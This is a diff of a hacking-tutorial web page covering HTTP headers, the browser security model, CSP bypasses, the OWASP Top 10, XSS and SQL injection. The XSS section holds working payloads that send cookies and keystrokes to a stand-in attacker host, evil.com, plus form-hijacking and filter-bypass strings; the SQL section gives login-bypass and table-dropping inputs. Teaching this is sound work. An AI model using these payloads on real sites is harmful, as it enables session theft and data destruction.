+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
+# Controls what resources can be loaded. Missing = easier XSS
+# 'unsafe-inline' = XSS might still work!
+# 'unsafe-eval' = eval() allowed, easier exploitation
 
-            <h3>DNS Hijacking</h3>
-            <p>Redirect DNS queries to malicious servers.</p>
-            
-            <div class="code"># Router-level: Change router's DNS settings to malicious DNS server
-# All devices on network now use attacker's DNS
-# Attacker can redirect any domain to any IP
+X-Frame-Options: DENY | SAMEORIGIN | ALLOW-FROM uri
+# Prevents clickjacking. Missing = site can be framed
+# DENY = can't be framed anywhere
+# SAMEORIGIN = only same origin can frame
 
-# Local-level: Modify /etc/hosts or C:\Windows\System32\drivers\etc\hosts
-192.168.1.100 bank.com
-# Victim types bank.com, goes to attacker's fake site</div>
+X-XSS-Protection: 1; mode=block
+# Browser's built-in XSS filter. Deprecated but still seen
+# 0 = disabled (interesting!)
+# 1 = enabled
+# 1; mode=block = block page entirely
+
+X-Content-Type-Options: nosniff
+# Prevents MIME sniffing. Missing = browser might execute CSS as JS
+
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+# Forces HTTPS. Missing = can strip SSL with MITM
+
+# ==================== AUTHENTICATION HEADERS ====================
+
+Cookie: session=abc123; user_id=1; role=admin
+# Session management. Look for:
+# - Predictable values
+# - Sensitive data in clear text
+# - Missing HttpOnly/Secure flags
+
+Authorization: Basic dXNlcjpwYXNz              # base64(user:pass)
+Authorization: Bearer eyJhbGciOiJIUzI1NiIs...   # JWT token
+Authorization: Digest username="user"...        # Digest auth
+
+Set-Cookie: session=abc123; 
+    Path=/; 
+    Domain=.example.com;
+    Expires=Thu, 01 Jan 2025 00:00:00 GMT;
+    HttpOnly;            # Can't access via JavaScript
+    Secure;              # Only sent over HTTPS
+    SameSite=Strict;     # Only sent to same origin
+
+# ==================== INFORMATION DISCLOSURE ====================
+
+Server: Apache/2.4.41 (Ubuntu)       # Exact version = search for CVEs
+X-Powered-By: PHP/7.4.3              # Backend technology
+X-AspNet-Version: 4.0.30319          # .NET version
+X-Generator: WordPress 5.8           # CMS and version
+
+# ==================== CORS HEADERS (Cross-Origin Resource Sharing) ====================
+
+Access-Control-Allow-Origin: *                    # DANGEROUS! Any site can read
+Access-Control-Allow-Origin: https://trusted.com # Only this origin
+Access-Control-Allow-Credentials: true           # Include cookies
+Access-Control-Allow-Methods: GET, POST, PUT     # Allowed methods
+Access-Control-Allow-Headers: X-Custom-Header    # Allowed request headers
+
+# Misconfigurations to look for:
+# - Origin: * with Credentials: true (shouldn't work but sometimes does)
+# - Reflecting Origin header without validation
+# - Allowing null origin</div>
+
+            <h3>Working with HTTP - Practical Tools</h3>
+            <div class="code"># ==================== COMMAND LINE HTTP ====================
+
+# Using curl
+curl https://example.com                    # Simple GET
+curl -v https://example.com                 # Verbose (see headers)
+curl -I https://example.com                 # HEAD request (headers only)
+curl -X POST https://example.com/login      # Specify method
+curl -d "user=admin&pass=123" URL           # POST data
+curl -H "Cookie: session=abc" URL           # Custom header
+curl -H "Content-Type: application/json" \
+     -d '{"user":"admin"}' URL              # JSON POST
+curl -k https://self-signed.com             # Ignore SSL errors
+curl -L URL                                 # Follow redirects
+curl -b cookies.txt -c cookies.txt URL      # Use/save cookies
+curl -x http://127.0.0.1:8080 URL           # Through proxy (Burp)
+
+# Using netcat (raw HTTP)
+echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
+
+# Using httpie (more readable)
+http GET https://example.com
+http POST https://example.com/login user=admin pass=123
+http PUT https://example.com/api/user/1 name=hacker
+
+# ==================== BROWSER DEV TOOLS ====================
+
+# Chrome/Firefox: Press F12
+
+Network Tab:
+- See all requests and responses
+- View/edit cookies
+- Copy as cURL command
+- Replay requests
+- Throttle network speed
+
+Console Tab:
+- Execute JavaScript
+- Access document.cookie
+- Manipulate DOM
+- Test XSS payloads
+
+Application Tab:
+- View cookies, localStorage, sessionStorage
+- Examine service workers
+- Check cached resources</div>
         </section>
 
-        <section class="section">
-            <h2 class="section-title">Defense & Detection</h2>
-            
+        <section id="browsers" class="section">
+            <h2 class="section-title">Browser Security Model</h2>
+            <p class="section-intro">Browsers are your attack platform AND your target's defense. Understanding how browsers protect users helps you bypass those protections. The browser is the battlefield where client-side attacks play out.</p>
+
+            <div class="metaphor-box">
+                <h4>🏰 The Browser as a Fortress</h4>
+                <p>The browser is like a medieval fortress protecting the user:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Same-Origin Policy:</strong> Walls between different kingdoms (websites)</li>
+                    <li><strong>Content Security Policy:</strong> Guards who check what enters</li>
+                    <li><strong>Cookies:</strong> Sealed letters only certain people can read</li>
+                    <li><strong>HTTPS:</strong> Encrypted messengers that can't be intercepted</li>
+                    <li><strong>Sandbox:</strong> Prison for untrusted code (JavaScript)</li>
+                </ul>
+                <p style="margin-top: 1rem; color: var(--accent);">Your job as a hacker is to find holes in these walls, bribe the guards, or trick the king into letting you in.</p>
+            </div>
+
+            <h3>Same-Origin Policy (SOP) - The Foundation</h3>
+            <p>The most important browser security feature. It prevents a website from reading data from another website. Without SOP, any website could read your bank account balance, your email, your private messages.</p>
+
+            <div class="code"># ==================== WHAT DEFINES AN "ORIGIN"? ====================
+
+# Origin = Protocol + Domain + Port (all three must match!)
+
+https://example.com:443     ← Origin 1
+https://example.com:443     ← SAME ORIGIN (port 443 is default for https)
+http://example.com:80       ← DIFFERENT (protocol: http vs https)
+https://sub.example.com:443 ← DIFFERENT (domain: sub.example.com)
+https://example.com:8080    ← DIFFERENT (port: 8080 vs 443)
+https://example.org:443     ← DIFFERENT (domain: .org vs .com)
+
+# ==================== WHAT SOP PREVENTS ====================
+
+# evil.com CANNOT:
+- Read responses from bank.com
+- Access bank.com cookies or localStorage
+- Read bank.com DOM content
+- Access bank.com frames/iframes content
+
+# Example: evil.com tries to steal your bank data
+fetch('https://bank.com/api/balance')
+  .then(r => r.json())
+  .then(data => sendToEvil(data));  // BLOCKED by SOP!
+
+# ==================== WHAT SOP ALLOWS (ATTACK SURFACE!) ====================
+
+# evil.com CAN:
+- Send requests TO bank.com (CSRF attacks!)
+- Embed images FROM bank.com (&lt;img src="bank.com/logo.png"&gt;)
+- Include scripts FROM bank.com (&lt;script src="bank.com/jquery.js"&gt;)
+- Link TO bank.com (&lt;a href="bank.com"&gt;)
+- Embed bank.com in iframe (if not blocked by X-Frame-Options)
+- Submit forms TO bank.com
+
+# This is why CSRF works - you can SEND requests, just not READ responses
+
+# ==================== SOP BYPASS MECHANISMS ====================
+
+# CORS (Cross-Origin Resource Sharing)
+# Server explicitly allows certain origins to read responses
+Access-Control-Allow-Origin: https://trusted.com
+
+# JSONP (old technique, still sometimes used)
+# Script tags bypass SOP, so server wraps data in callback
+&lt;script src="bank.com/api/data?callback=myFunction"&gt;
+# Returns: myFunction({"balance": 10000})
+
+# document.domain relaxation
+# Subdomains can access each other by setting document.domain
+# app.example.com and api.example.com both set document.domain = "example.com"
+
+# postMessage API
+# Windows can explicitly send messages to each other
+window.parent.postMessage("data", "https://target.com");</div>
+
+            <h3>Cookies - Session Management Deep Dive</h3>
+            <div class="code"># ==================== COOKIE STRUCTURE ====================
+
+Set-Cookie: session=abc123xyz;        # Name=Value
+    Domain=.example.com;              # Which domains receive this cookie
+    Path=/app;                        # Which paths receive this cookie
+    Expires=Thu, 01 Jan 2026 00:00:00 GMT;  # When it expires
+    Max-Age=31536000;                 # Alternative to Expires (seconds)
+    HttpOnly;                         # JavaScript CAN'T access
+    Secure;                           # Only sent over HTTPS
+    SameSite=Strict;                  # CSRF protection
+
+# ==================== COOKIE FLAGS EXPLAINED ====================
+
+HttpOnly:
+- JavaScript document.cookie CANNOT see this cookie
+- Protects against XSS session theft
+- CRITICAL for session cookies
+- Check: if XSS exists but cookie is HttpOnly, you need other tricks
+
+Secure:
+- Cookie only sent over HTTPS connections
+- Prevents sniffing over HTTP
+- Not set? Cookie sent in clear text on HTTP
+
+SameSite:
+- Strict: Cookie NEVER sent cross-site (breaks some UX)
+- Lax: Sent on top-level navigations (links) but not forms/AJAX
+- None: Always sent (must have Secure flag)
+
+# ==================== VULNERABILITY EXAMPLES ====================
+
+# Missing HttpOnly
+Set-Cookie: session=abc123
+# XSS can steal: document.cookie → "session=abc123"
+
+# Missing Secure
+Set-Cookie: session=abc123; HttpOnly
+# Man-in-the-middle can sniff cookie on HTTP connection
+
+# Missing SameSite (or None)
+Set-Cookie: session=abc123; HttpOnly; Secure
+# CSRF attacks possible - cookie sent on cross-site requests
+
+# Overly Broad Domain
+Set-Cookie: session=abc123; Domain=.example.com
+# ANY subdomain can read AND set this cookie
+# evil.example.com can steal session from app.example.com
+
+# Predictable Value
+Set-Cookie: session=user123_1705123456
+# Attacker can guess other sessions: user456_1705123456
+
+# Sensitive Data in Cookie
+Set-Cookie: user_role=admin; user_id=123
+# Attacker might just change: user_role=superadmin</div>
+
+            <h3>Content Security Policy (CSP)</h3>
+            <div class="code"># ==================== CSP BASICS ====================
+
+# CSP controls what resources a page can load
+# Sent as HTTP header or meta tag
+
+Content-Security-Policy: default-src 'self';
+                        script-src 'self' https://cdn.example.com;
+                        style-src 'self' 'unsafe-inline';
+                        img-src *;
+                        frame-ancestors 'none';
+
+# ==================== CSP DIRECTIVES ====================
+
+default-src     # Fallback for all resource types
+script-src      # JavaScript sources
+style-src       # CSS sources
+img-src         # Image sources
+font-src        # Font sources
+connect-src     # AJAX, WebSocket, fetch destinations
+frame-src       # iframe sources
+frame-ancestors # What can frame this page (replaces X-Frame-Options)
+form-action     # Where forms can submit
+base-uri        # Allowed base URLs
+object-src      # Flash, Java applets (block with 'none')
+report-uri      # Where to send violation reports
+
+# ==================== CSP VALUES ====================
+
+'self'          # Same origin only
+'none'          # Block everything
+'unsafe-inline' # Allow inline scripts/styles (weakens protection!)
+'unsafe-eval'   # Allow eval() (weakens protection!)
+'nonce-abc123'  # Only scripts with matching nonce
+'sha256-...'    # Only scripts matching hash
+https:          # Only HTTPS resources
+*.example.com   # All subdomains of example.com
+
+# ==================== BYPASSING CSP ====================
+
+# If 'unsafe-inline' is present:
+- XSS with inline scripts works normally
+
+# If JSONP endpoint on whitelisted domain:
+&lt;script src="trusted.com/api?callback=alert(1)//"&gt;&lt;/script&gt;
+
+# If AngularJS on whitelisted CDN:
+{{constructor.constructor('alert(1)')()}}
+
+# If base-uri not set:
+&lt;base href="https://evil.com/"&gt;
+# Now all relative URLs load from evil.com
+
+# If script-src includes 'unsafe-eval':
+eval('alert(1)');
+new Function('alert(1)')();
+
+# CSP Report-Only mode (doesn't block, just reports):
+Content-Security-Policy-Report-Only: ...
+# Good for testing, but might be left in production!</div>
+
+            <h3>Other Browser Security Features</h3>
             <div class="card-grid">
                 <div class="card">
-                    <h4>🛡️ Prevent MITM</h4>
-                    <ul style="margin-top: 1rem; font-size: 0.9rem;">
-                        <li>Use HTTPS everywhere</li>
-                        <li>Static ARP entries</li>
-                        <li>Network segmentation</li>
-                        <li>Encrypted VPN tunnels</li>
-                    </ul>
+                    <h4>🖼️ X-Frame-Options</h4>
+                    <p><strong>Purpose:</strong> Prevent clickjacking by controlling whether page can be framed.</p>
+                    <div class="code" style="margin-top: 0.5rem; font-size: 0.75rem;">DENY           # Never allow framing
+SAMEORIGIN     # Only same origin
+ALLOW-FROM url # Specific URL (deprecated)</div>
+                    <p style="margin-top: 0.5rem; font-size: 0.85rem;">Missing? Page can be framed → clickjacking possible!</p>
                 </div>
                 <div class="card">
-                    <h4>🔍 Detect Attacks</h4>
-                    <ul style="margin-top: 1rem; font-size: 0.9rem;">
-                        <li>IDS/IPS systems (Snort, Suricata)</li>
-                        <li>Monitor ARP tables for changes</li>
-                        <li>Watch for port scans</li>
-                        <li>Log all network activity</li>
-                    </ul>
+                    <h4>🔒 HSTS</h4>
+                    <p><strong>Purpose:</strong> Force HTTPS, prevent SSL stripping attacks.</p>
+                    <div class="code" style="margin-top: 0.5rem; font-size: 0.75rem;">Strict-Transport-Security: 
+  max-age=31536000; 
+  includeSubDomains; 
+  preload</div>
+                    <p style="margin-top: 0.5rem; font-size: 0.85rem;">Missing? First request vulnerable to MITM.</p>
                 </div>
                 <div class="card">
-                    <h4>🔒 Secure Services</h4>
-                    <ul style="margin-top: 1rem; font-size: 0.9rem;">
-                        <li>Close unused ports</li>
-                        <li>Strong firewall rules</li>
-                        <li>Disable unnecessary services</li>
-                        <li>Keep software updated</li>
-                    </ul>
+                    <h4>📄 X-Content-Type-Options</h4>
+                    <p><strong>Purpose:</strong> Prevent MIME sniffing (treating CSS as JavaScript).</p>
+                    <div class="code" style="margin-top: 0.5rem; font-size: 0.75rem;">X-Content-Type-Options: nosniff</div>
+                    <p style="margin-top: 0.5rem; font-size: 0.85rem;">Missing? Browser might execute non-script as script.</p>
                 </div>
                 <div class="card">
-                    <h4>📊 Monitor Everything</h4>
-                    <ul style="margin-top: 1rem; font-size: 0.9rem;">
-                        <li>Baseline normal traffic</li>
-                        <li>Alert on anomalies</li>
-                        <li>Regular network audits</li>
-                        <li>Honeypots to detect attackers</li>
-                    </ul>
+                    <h4>🌐 CORS</h4>
+                    <p><strong>Purpose:</strong> Allow controlled cross-origin requests.</p>
+                    <div class="code" style="margin-top: 0.5rem; font-size: 0.75rem;">Access-Control-Allow-Origin: *
+# DANGEROUS with credentials!</div>
+                    <p style="margin-top: 0.5rem; font-size: 0.85rem;">Misconfigured? Arbitrary sites can read responses.</p>
                 </div>
             </div>
         </section>
 
-        <section class="section">
-            <h2 class="section-title">Chapter Summary</h2>
-            <div class="card-grid">
+        <section id="owasp" class="section">
+            <h2 class="section-title">OWASP Top 10: The Most Critical Vulnerabilities</h2>
+            <p class="section-intro">OWASP (Open Web Application Security Project) maintains the definitive list of the most dangerous web vulnerabilities. This list is updated periodically based on real-world data. Every web hacker must know these inside and out - they represent the most common and impactful vulnerabilities you'll encounter.</p>
+
+            <div class="info-box">
+                <h4>Why OWASP Top 10 Matters</h4>
+                <p>The OWASP Top 10 isn't just a list - it's a framework that drives the entire security industry. Penetration test reports are often organized around it. Security tools scan for it. Compliance frameworks reference it. Bug bounty programs prioritize it. If you understand these 10 categories deeply, you understand web security.</p>
+            </div>
+
+            <div class="card-grid" style="margin-top: 2rem;">
                 <div class="card">
-                    <h4>✅ What You Learned</h4>
-                    <ul style="margin-top: 1rem; font-size: 0.9rem;">
-                        <li>OSI and TCP/IP models</li>
-                        <li>IP addressing, ports, and protocols</li>
-                        <li>TCP vs UDP fundamentals</li>
-                        <li>DNS, ARP, and ICMP protocols</li>
-                        <li>Network scanning with Nmap</li>
-                        <li>MITM, DoS, and packet sniffing attacks</li>
-                        <li>Defense and detection strategies</li>
+                    <h4>A01: Broken Access Control 🥇</h4>
+                    <p>The #1 vulnerability. Users can access resources they shouldn't. Examples:</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>IDOR: Changing /user/123 to /user/124 shows another user's data</li>
+                        <li>Privilege escalation: Normal user accesses admin functions</li>
+                        <li>Directory traversal: ../../etc/passwd</li>
+                        <li>Missing function-level access control</li>
                     </ul>
                 </div>
                 <div class="card">
-                    <h4>🎯 Next Chapter Preview</h4>
-                    <p>In Chapter 06, we'll dive into System Exploitation - finding and exploiting vulnerabilities in operating systems, privilege escalation, and maintaining persistent access.</p>
+                    <h4>A02: Cryptographic Failures</h4>
+                    <p>Sensitive data exposed due to weak or missing cryptography:</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>Passwords stored in plaintext or with weak hashing (MD5)</li>
+                        <li>HTTP instead of HTTPS</li>
+                        <li>Weak encryption algorithms (DES, RC4)</li>
+                        <li>Hardcoded encryption keys</li>
+                        <li>Sensitive data in URL parameters</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>A03: Injection 💉</h4>
+                    <p>Untrusted data interpreted as commands:</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>SQL Injection (SQLi)</li>
+                        <li>NoSQL Injection</li>
+                        <li>OS Command Injection</li>
+                        <li>LDAP Injection</li>
+                        <li>XPath Injection</li>
+                        <li>Template Injection (SSTI)</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>A04: Insecure Design</h4>
+                    <p>Architectural flaws that can't be fixed with code - requires redesign:</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>Missing rate limiting on password reset</li>
+                        <li>Security questions with public answers</li>
+                        <li>Trusting client-side validation only</li>
+                        <li>Flawed business logic</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>A05: Security Misconfiguration</h4>
+                    <p>Insecure defaults, incomplete configs, verbose errors:</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>Default passwords unchanged</li>
+                        <li>Unnecessary features enabled</li>
+                        <li>Stack traces in error messages</li>
+                        <li>Missing security headers</li>
+                        <li>Directory listing enabled</li>
+                        <li>Cloud storage publicly accessible</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>A06: Vulnerable Components</h4>
+                    <p>Using libraries with known vulnerabilities:</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>Outdated frameworks (Struts, Spring)</li>
+                        <li>Vulnerable JavaScript libraries</li>
+                        <li>Unpatched CMS (WordPress, Drupal)</li>
+                        <li>No component inventory</li>
+                        <li>Log4j, jQuery, Bootstrap vulnerabilities</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>A07: Auth Failures</h4>
+                    <p>Broken authentication and session management:</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>Weak passwords allowed</li>
+                        <li>Credential stuffing vulnerable</li>
+                        <li>Session fixation</li>
+                        <li>Session tokens in URL</li>
+                        <li>Missing MFA</li>
+                        <li>Sessions that don't expire</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>A08: Software Integrity Failures</h4>
+                    <p>Code from untrusted sources, insecure updates:</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>CDN scripts without integrity checks</li>
+                        <li>Insecure CI/CD pipelines</li>
+                        <li>Auto-updates without verification</li>
+                        <li>Deserialization vulnerabilities</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>A09: Logging Failures</h4>
+                    <p>Insufficient logging and monitoring:</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>Login failures not logged</li>
+                        <li>No alerting on attacks</li>
+                        <li>Logs stored only locally</li>
+                        <li>Sensitive data in logs</li>
+                        <li>No log integrity protection</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h4>A10: SSRF</h4>
+                    <p>Server-Side Request Forgery - server makes requests on attacker's behalf:</p>
+                    <ul style="margin-top: 0.5rem; font-size: 0.85rem;">
+                        <li>Access internal services</li>
+                        <li>Cloud metadata endpoints</li>
+                        <li>Port scanning from server</li>
+                        <li>Bypass access controls</li>
+                        <li>Read local files via file:// protocol</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="warning-box" style="margin-top: 2rem;">
+                <h4>⚠️ Beyond the Top 10</h4>
+                <p>The OWASP Top 10 is a starting point, not a complete list. Other critical vulnerabilities include:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>XML External Entity (XXE):</strong> Parsing XML that references external entities</li>
+                    <li><strong>Insecure Direct Object Reference (IDOR):</strong> Direct access to objects via user input</li>
+                    <li><strong>Business Logic Flaws:</strong> Abusing legitimate functionality</li>
+                    <li><strong>Race Conditions:</strong> Exploiting timing windows</li>
+                    <li><strong>HTTP Request Smuggling:</strong> Bypassing security with malformed requests</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="xss" class="section">
+            <h2 class="section-title">Cross-Site Scripting (XSS)</h2>
+            <p class="section-intro">XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. It's one of the most common and dangerous vulnerabilities - and one of the most fun to exploit. When you find XSS, you can make the victim's browser do almost anything they could do themselves.</p>
+
+            <div class="metaphor-box">
+                <h4>📺 The Hijacked TV Broadcast Metaphor</h4>
+                <p>Imagine a TV station (the website) that plays viewer-submitted content without checking it. An attacker submits a video that says "Send your bank password to this address!" and it gets broadcast to millions of viewers. That's XSS - injecting your content into a trusted source so victims trust and execute it.</p>
+            </div>
+
+            <h3>Types of XSS</h3>
+            <div class="card-grid">
+                <div class="card">
+                    <h4>🔄 Reflected XSS</h4>
+                    <p>Payload is in the request and immediately reflected in the response. Victim must click a malicious link. Non-persistent.</p>
+                    <div class="code" style="margin-top: 1rem; font-size: 0.75rem;"># Vulnerable URL:
+/search?q=&lt;script&gt;alert(1)&lt;/script&gt;
+
+# Page shows:
+"Results for &lt;script&gt;alert(1)&lt;/script&gt;"
+
+# Attack: Send victim this link:
+https://shop.com/search?q=&lt;script&gt;
+document.location='https://evil.com/steal?c='
++document.cookie&lt;/script&gt;</div>
+                </div>
+                <div class="card">
+                    <h4>💾 Stored XSS</h4>
+                    <p>Payload stored in database, served to ALL users who view that page. Persistent and more dangerous. Comments, profiles, messages.</p>
+                    <div class="code" style="margin-top: 1rem; font-size: 0.75rem;"># Attacker posts comment:
+"Great article! &lt;script&gt;
+  fetch('https://evil.com/steal?c='
+    +document.cookie)
+&lt;/script&gt;"
+
+# Every visitor to the page:
+- Gets the script executed
+- Cookies sent to attacker
+- Session hijacked!</div>
+                </div>
+                <div class="card">
+                    <h4>🔧 DOM-based XSS</h4>
+                    <p>Payload never hits server - client-side JavaScript processes attacker input unsafely. Harder to detect because server logs show nothing suspicious.</p>
+                    <div class="code" style="margin-top: 1rem; font-size: 0.75rem;"># Vulnerable JavaScript:
+document.write(location.hash)
+document.getElementById('x').innerHTML = url
+
+# Attack:
+page.html#&lt;img src=x onerror=alert(1)&gt;
+
+# Sources: location.hash, location.search
+# Sinks: innerHTML, document.write, eval</div>
+                </div>
+            </div>
+
+            <h3>XSS Payloads - From Basic to Advanced</h3>
+            <div class="code"># ==================== BASIC DETECTION ====================
+
+&lt;script&gt;alert('XSS')&lt;/script&gt;           # Classic
+&lt;script&gt;alert(document.domain)&lt;/script&gt;  # Prove which domain
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;  # Show cookies
+
+# ==================== TAG-BASED (when &lt;script&gt; filtered) ====================
+
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;svg/onload=alert(1)&gt;                    # No space needed
+&lt;body onload=alert(1)&gt;
+&lt;input onfocus=alert(1) autofocus&gt;
+&lt;marquee onstart=alert(1)&gt;
+&lt;video src=x onerror=alert(1)&gt;
+&lt;audio src=x onerror=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;iframe src="javascript:alert(1)"&gt;
+&lt;object data="javascript:alert(1)"&gt;
+
+# ==================== EVENT HANDLER VARIATIONS ====================
+
+&lt;div onmouseover=alert(1)&gt;Hover me&lt;/div&gt;
+&lt;div onclick=alert(1)&gt;Click me&lt;/div&gt;
+&lt;div onmouseenter=alert(1)&gt;x&lt;/div&gt;
+&lt;body onpageshow=alert(1)&gt;
+&lt;body onresize=alert(1)&gt; (resize window)
+
+# ==================== BYPASSING FILTERS ====================
+
+# Case variation
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;IMG SRC=x ONERROR=alert(1)&gt;
+
+# Encoded characters
+&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;  # "XSS"
+&lt;img src=x onerror=alert&#40;1&#41;&gt;                         # HTML entities
+&lt;img src=x onerror=\u0061lert(1)&gt;                       # Unicode
+
+# Breaking out of attributes
+" onmouseover="alert(1)
+' onfocus='alert(1)' autofocus='
+
+# Nested/double encoding
+%253Cscript%253Ealert(1)%253C/script%253E
+
+# JavaScript protocol
+&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;
+&lt;a href="JaVaScRiPt:alert(1)"&gt;click&lt;/a&gt;
+
+# Data URI
+&lt;a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;click&lt;/a&gt;
+
+# SVG with embedded script
+&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
+
+# Template literals (ES6)
+&lt;script&gt;alert`1`&lt;/script&gt;
+
+# ==================== STEALING COOKIES ====================
+
+&lt;script&gt;
+new Image().src="https://evil.com/steal?c="+document.cookie;
+&lt;/script&gt;
+
+&lt;script&gt;
+fetch('https://evil.com/steal?c='+document.cookie);
+&lt;/script&gt;
+
+&lt;img src=x onerror="this.src='https://evil.com/steal?c='+document.cookie"&gt;
+
+# ==================== KEYLOGGER ====================
+
+&lt;script&gt;
+document.onkeypress=function(e){
+  new Image().src="https://evil.com/log?k="+e.key;
+}
+&lt;/script&gt;
+
+# ==================== FORM HIJACKING ====================
+
+&lt;script&gt;
+document.forms[0].action='https://evil.com/phish';
+&lt;/script&gt;
+
+# ==================== DEFACEMENT ====================
+
+&lt;script&gt;
+document.body.innerHTML='&lt;h1&gt;Hacked by XSS&lt;/h1&gt;';
+&lt;/script&gt;
+
+# ==================== BEEFHOOK (Advanced) ====================
+
+&lt;script src="https://evil.com/hook.js"&gt;&lt;/script&gt;
+# BeEF framework gives full browser control</div>
+
+            <h3>XSS Contexts and Breakouts</h3>
+            <div class="code"># ==================== HTML CONTEXT ====================
+# Your input appears in HTML body
+&lt;p&gt;Hello USER_INPUT&lt;/p&gt;
+# Payload: &lt;script&gt;alert(1)&lt;/script&gt;
+
+# ==================== ATTRIBUTE CONTEXT ====================
+# Your input is inside an HTML attribute
+&lt;input value="USER_INPUT"&gt;
+# Payload: " onmouseover="alert(1)
+# Result: &lt;input value="" onmouseover="alert(1)"&gt;
+
+# Single quotes:
+&lt;input value='USER_INPUT'&gt;
+# Payload: ' onfocus='alert(1)' autofocus='
+
+# ==================== JAVASCRIPT CONTEXT ====================
+# Your input is inside a script block
+&lt;script&gt;var x = 'USER_INPUT';&lt;/script&gt;
+# Payload: ';alert(1);//
+# Result: &lt;script&gt;var x = '';alert(1);//';&lt;/script&gt;
+
+# ==================== URL CONTEXT ====================
+&lt;a href="USER_INPUT"&gt;
+# Payload: javascript:alert(1)
+
+# ==================== CSS CONTEXT ====================
+&lt;style&gt;body { background: USER_INPUT }&lt;/style&gt;
+# Payload: red;} &lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div>
+
+            <div class="warning-box">
+                <h4>⚠️ XSS Prevention</h4>
+                <p>When testing, always get permission. When defending:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Output encoding:</strong> Escape &lt; &gt; &amp; " ' based on context</li>
+                    <li><strong>Content Security Policy:</strong> Restrict script sources</li>
+                    <li><strong>HttpOnly cookies:</strong> Prevent cookie theft</li>
+                    <li><strong>Input validation:</strong> Whitelist allowed characters</li>
+                    <li><strong>Modern frameworks:</strong> React, Angular auto-escape by default</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="sqli" class="section">
+            <h2 class="section-title">SQL Injection - The King of Web Vulnerabilities</h2>
+            <p class="section-intro">SQL injection lets attackers manipulate database queries by injecting malicious SQL code. It can bypass authentication, extract entire databases, modify or delete data, and even execute system commands. SQLi has been around for over 20 years and is STILL one of the most dangerous and common vulnerabilities.</p>
+
+            <div class="metaphor-box">
+                <h4>📋 The Order Form Metaphor</h4>
+                <p>Imagine a restaurant order form where you write what you want:</p>
+                <p style="margin-top: 0.5rem;"><strong>Normal:</strong> "I want a pizza"</p>
+                <p style="margin-top: 0.5rem;"><strong>SQL Injection:</strong> "I want a pizza; and give me all the money in the register; and delete the order history"</p>
+                <p style="margin-top: 0.5rem;">The system just follows orders - it doesn't understand that some of those "orders" are malicious commands!</p>
+            </div>
+
+            <h3>How SQL Injection Works</h3>
+            <div class="code"># ==================== THE VULNERABLE CODE ====================
+
+# Developer writes this PHP code:
+$query = "SELECT * FROM users WHERE name = '" + $username + "'";
+
+# ==================== NORMAL INPUT ====================
+
+Input: john
+Query: SELECT * FROM users WHERE name = 'john'
+Result: Returns user "john" - works correctly!
+
+# ==================== MALICIOUS INPUT ====================
+
+Input: ' OR '1'='1
+Query: SELECT * FROM users WHERE name = '' OR '1'='1'
+Result: Returns ALL users! (because '1'='1' is always true)
+
+# ==================== AUTHENTICATION BYPASS ====================
+
+Login form asks for username and password:
+SELECT * FROM users WHERE username = '$user' AND password = '$pass'
+
+Input: admin' --
+Query: SELECT * FROM users WHERE username = 'admin' --' AND password = 'whatever'
+Result: The -- comments out the rest, so password check is IGNORED!
+You're now logged in as admin!
+
+# ==================== DESTRUCTIVE INPUT ====================
+
+Input: '; DROP TABLE users; --
+Query: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
+Result: First query returns nothing, second query DELETES THE TABLE!
+
+# ==================== WHY IT WORKS ====================
+
+The application TRUSTS user input
+It CONCATENATES user input directly into the query
+The database EXECUTES the combined query without knowing parts are malicious
+
+# ==================== THE FIX: PARAMETERIZED QUERIES ====================
+
+# Instead of string concatenation:
+$stmt = $pdo->prepare("SELECT * FROM users WHERE name = ?");
+$stmt->execute([$username]);
+
+# Now the input is ALWAYS treated as data, never as code!</div>
+
+            <h3>SQL Injection Types</h3>
+            <div class="card-grid">
+                <div class="card">
+                    <h4>📊 In-Band SQLi (Classic)</h4>
+                    <p>Results appear directly on the page. Easiest to exploit.</p>
+                    <div class="code" style="margin-top: 1rem; font-size: 0.75rem;"># Union-based: Combine results
+' UNION SELECT username,password FROM users--
+
+# Error-based: Force errors that reveal data
+' AND 1=CONVERT(int,@@version)--</div>
+                </div>
+                <div class="card">
+                    <h4>🔍 Blind SQLi (Boolean)</h4>
